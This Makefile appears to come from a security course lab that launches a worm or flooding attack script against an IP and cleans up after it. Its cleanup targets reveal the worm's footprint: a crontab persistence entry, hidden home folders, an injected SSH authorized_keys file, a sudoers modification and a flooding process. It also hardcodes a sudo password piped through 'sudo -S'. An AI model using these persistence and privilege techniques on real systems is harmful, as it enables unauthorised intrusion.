lg:
	@echo cs2019 | sudo -S echo "Makefile starts"

attack: lg
	@sudo chmod +x ./scripts/main.sh
	@sudo ./scripts/main.sh ${ip} ${first}

victim_reset: lg
	@sudo rm -rf /home/victim/.etc
	@sudo rm -rf /home/victim/.firefox
	@sudo rm -rf /home/victim/.Launch_Attack
	@sudo rm -rf /home/victim/.you_cant_see_me
	@sudo pkill -f 'Flooding_Attack' 
	@sudo sed -i '/launcher.sh/d' /etc/crontab
	@echo Computer cleaned.

victim_reset_all: lg
	@sudo rm -rf /home/victim/.etc
	@sudo rm -rf /home/victim/.firefox
	@sudo rm -rf /home/victim/.Launch_Attack
	@sudo rm -rf /home/victim/.you_cant_see_me
	@sudo pkill -f 'Flooding_Attack' 
	@sudo sed -i '/launcher.sh/d' /etc/crontab
	@sudo rm -f ~/.ssh/authorized_keys
	@sudo rm -rf /tmp/.worm0716023
	@sudo sed -i '/victim/d' /etc/sudoers
	@echo Computer cleaned.

attacker_reset: lg
	@sudo rm -rf ~/.ssh
	@echo Computer cleaned.